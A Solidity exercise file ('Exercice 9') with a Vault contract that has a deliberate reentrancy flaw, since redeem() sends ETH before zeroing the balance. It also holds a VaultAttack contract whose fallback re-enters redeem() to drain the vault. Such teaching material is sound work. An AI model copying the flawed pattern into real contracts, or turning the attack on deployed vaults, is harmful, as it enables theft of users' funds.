pragma solidity ^0.4.24;

// //*** Exercice 9 ***//
// // You can store ETH in this contract and redeem them.
contract Vault {
     mapping(address => uint) public balances;

     /// @dev Store ETH in the contract.
    function store() payable {
        balances[msg.sender]+=msg.value;
    }

    /// @dev Redeem your ETH.
    function redeem() {
        msg.sender.call.value(balances[msg.sender])();
        balances[msg.sender]=0;
    }
}


contract VaultAttack {

    Vault victim;
    uint public called;
    constructor(address _victim) public {
        victim = Vault(_victim);
    }

    function() public payable {
        // victim.store.value(msg.value);
        victim.redeem();
        called++;
    }

    // victim is vulnerable to a reentrancy attack
    function attack() external payable returns(bool success) {
        victim.store.value(msg.value)();
        victim.redeem();
        return true;
    }

    function getBalances() external view returns(uint256 local, uint256 atVictim) {
        local = address(this).balance;
        atVictim = victim.balances(address(this));
    }

}
